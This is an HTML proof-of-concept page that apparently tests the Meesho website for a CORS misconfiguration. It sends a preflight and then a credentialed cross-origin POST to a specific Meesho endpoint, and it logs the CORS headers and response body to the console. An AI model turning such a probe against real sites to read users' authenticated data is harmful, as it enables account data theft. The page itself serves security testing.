<!DOCTYPE html>
<html>
<head><title>Meesho CORS Test</title></head>
<body>
<h2>Meesho CORS PoC</h2>
<p><strong>1. Log into Meesho first</strong><br>
2. Click button below<br>
3. Check Console + Network tab</p>

<button onclick="runTest()">Run CORS Test</button>

<script>
async function runTest() {
  console.clear();
  
  // === CHANGE THIS URL TO A FRESH ONE ===
  const targetUrl = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB"; 

  console.log("🔍 Testing from origin:", window.location.origin);
  console.log("Target:", targetUrl);

  // Try OPTIONS preflight
  try {
    const preflight = await fetch(targetUrl, {
      method: "OPTIONS",
      headers: {
        "Origin": window.location.origin,
        "Access-Control-Request-Method": "POST",
        "Access-Control-Request-Headers": "content-type"
      }
    });
    console.log("✅ Preflight Status:", preflight.status);
    console.log("ACAO:", preflight.headers.get("access-control-allow-origin"));
    console.log("ACAC:", preflight.headers.get("access-control-allow-credentials"));
  } catch(e) {
    console.error("❌ Preflight blocked:", e.message);
  }

  // Try actual request
  try {
    const res = await fetch(targetUrl, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "text/plain" },
      body: "{}"
    });
    console.log("POST Status:", res.status);
    console.log("Response ACAO:", res.headers.get("access-control-allow-origin"));
    const text = await res.text();
    console.log("Response Body:", text);
  } catch(e) {
    console.error("❌ Main request failed:", e.message);
  }
}
</script>
</body>
</html>
